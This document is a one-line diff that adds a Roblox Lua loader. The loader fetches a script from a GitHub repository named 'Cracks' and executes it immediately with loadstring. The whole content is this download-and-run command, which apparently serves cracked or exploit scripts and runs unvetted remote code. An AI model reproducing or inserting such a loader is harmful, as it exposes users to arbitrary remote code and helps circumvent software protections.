@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SoyAdriYT/Cracks/refs/heads/main/Alexisback/Aquaracerprotect.lua'))()
